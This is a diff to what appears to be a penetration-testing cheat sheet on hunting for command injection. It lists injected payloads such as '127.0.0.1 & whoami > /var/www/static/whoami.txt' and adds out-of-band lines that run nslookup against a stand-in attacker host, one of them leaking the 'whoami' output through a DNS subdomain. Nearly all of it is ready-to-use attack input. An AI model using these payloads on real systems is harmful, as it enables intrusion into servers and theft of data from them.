@@ -15,3 +15,6 @@ Hunting for Command injection:
 ->> 127.0.0.1 && ping -c 10 127.0.0.1 &	  "Unix and Windows"
 - Output the response of the command in the web root and retrive the file directly using browser
 ->> 127.0.0.1 & whoami > /var/www/static/whoami.txt &
+- Open an out-of-band channel back to a server you cantrol
+->> 127.0.0.1 & nslookup idnwieun.web-attacker.com &
+->> 127.0.0.1 & nslookup `whoami`.idnwieun.web-attacker.com &
